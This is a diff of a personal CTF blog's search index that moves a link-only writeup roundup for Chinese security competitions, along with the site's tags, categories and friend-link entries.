-<p><a class="link"   href="https://blog.jacki.cn/2024/11/29/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/#REVERSE-bouquet" >天山固网<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://blog.csdn.net/luochen2436/article/details/132964576" >2023黑龙江省赛<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://blog.csdn.net/luochen2436/article/details/132138412" >CTF Crypto — 七八月份比赛杂题记录_ctf替换了部分模型权重-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://dexterjie.github.io/2023/09/17/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/%E9%BB%91%E9%BE%99%E6%B1%9F%E7%9C%81%E8%B5%9B/#%E5%86%B3%E8%B5%9B" >黑龙江省赛 | DexterJie’Blog<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://blog.csdn.net/qq_42880719/article/details/126175056" >蓝帽杯2022年半决赛 writeup(附取证题目+解压密码+附件)_2022蓝帽杯半决赛-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://hwlanxiaojun.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/#0x-04-awdshell" >安恒杯四月月赛题解<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="http://www.andynoel.xyz/?p=416" >2022 BluehatCup Semi-Finals | Partly Writeup – AndyNoel’s Blog<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://c-lby.top/2024/2024YLCTF-1/" >『YLCTF 源鲁杯 2024』 PWN-1 WP | C_LBY’s BLOG<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://mp.weixin.qq.com/s/me3pY_xa2RIHOncin9B5QA" >2024年福建省大学生数据安全大赛-技能实践赛决赛<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://www.lo-ve.cn/index.php/archives/65/" >2024第二届福建省数据安全大赛-浅兮<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-      <categories>
-        <category>题解</category>
-      </categories>
-  </entry>
-  <entry>
     <title>2024羊城杯 Misc方向部分WP</title>
     <url>//post/ycb2024wp/</url>
     <content><![CDATA[<h3 id="hiden">hiden</h3>
@@ -4351,6 +4331,26 @@ or summary contain a given string such as “spam”, type “modules spam”.</
       </tags>
   </entry>
   <entry>
+    <title>2024 楚彗杯 超级WriteUp</title>
+    <url>//post/sbchb666/</url>
+    <content><![CDATA[<p><a class="link"   href="https://blog.jacki.cn/2024/11/29/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/#CRYPTO-ddd" >2024 天山固网杯决赛 部分WP - m0h31h31<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://dexterjie.github.io/2024/12/01/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A6%8F%E5%BB%BA%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" >2024第二届福建省数据安全大赛<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.jacki.cn/2024/11/29/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/#REVERSE-bouquet" >天山固网<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/luochen2436/article/details/132964576" >2023黑龙江省赛<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/luochen2436/article/details/132138412" >CTF Crypto — 七八月份比赛杂题记录_ctf替换了部分模型权重-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://dexterjie.github.io/2023/09/17/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/%E9%BB%91%E9%BE%99%E6%B1%9F%E7%9C%81%E8%B5%9B/#%E5%86%B3%E8%B5%9B" >黑龙江省赛 | DexterJie’Blog<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/qq_42880719/article/details/126175056" >蓝帽杯2022年半决赛 writeup(附取证题目+解压密码+附件)_2022蓝帽杯半决赛-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://hwlanxiaojun.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/#0x-04-awdshell" >安恒杯四月月赛题解<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="http://www.andynoel.xyz/?p=416" >2022 BluehatCup Semi-Finals | Partly Writeup – AndyNoel’s Blog<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://c-lby.top/2024/2024YLCTF-1/" >『YLCTF 源鲁杯 2024』 PWN-1 WP | C_LBY’s BLOG<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://mp.weixin.qq.com/s/me3pY_xa2RIHOncin9B5QA" >2024年福建省大学生数据安全大赛-技能实践赛决赛<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.lo-ve.cn/index.php/archives/65/" >2024第二届福建省数据安全大赛-浅兮<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>题解</category>
+      </categories>
+  </entry>
+  <entry>
     <title>深度理解压缩包伪加密</title>
     <url>//post/ysbwjm/</url>
     <content><![CDATA[<p>压缩包伪加密看似很简单，但其实网上绝大部分教程都没有讲明白，所以准备自己写一篇文章，以zip文件为主。</p>
@@ -4529,6 +4529,26 @@ or summary contain a given string such as “spam”, type “modules spam”.</
     <title>abouts</title>
     <url>/about/index.html</url>
     <content><![CDATA[<p>一个菜鸡CTFer，以前是学Misc的，现在学烧烤…</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>tags</title>
+    <url>/tags/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>categories</title>
+    <url>/categories/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>友情链接</title>
+    <url>/links/index.html</url>
+    <content><![CDATA[<h3 id="我的友链信息">我的友链信息</h3>
+<p>name: C3ngH</p>
+<p>avatar: <a class="link"   href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" >https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg<i class="fas fa-external-link-alt"></i></a></p>
+<p>link: <a href="https://c3ngh.top/">https://c3ngh.top/</a></p>
+<p>description: 广告位招租</p>
 ]]></content>
   </entry>
   <entry>
@@ -4837,26 +4857,6 @@ or summary contain a given string such as “spam”, type “modules spam”.</
                  ></p>
 <h3 id="写在最后">写在最后</h3>
 <p>欲买桂花同载酒，终不似，少年游。如果有什么喜欢的东西，在能力范围内的一定要买给自己！就算是很久很久以后在二手市场看到自己曾经喜欢过的物品也值得购买，因为那些也是曾经一个少年的梦想。对自己好点。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>categories</title>
-    <url>/categories/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>tags</title>
-    <url>/tags/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>友情链接</title>
-    <url>/links/index.html</url>
-    <content><![CDATA[<h3 id="我的友链信息">我的友链信息</h3>
-<p>name: C3ngH</p>
-<p>avatar: <a class="link"   href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" >https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg<i class="fas fa-external-link-alt"></i></a></p>
-<p>link: <a href="https://c3ngh.top/">https://c3ngh.top/</a></p>
-<p>description: 广告位招租</p>
 ]]></content>
   </entry>
 </search>
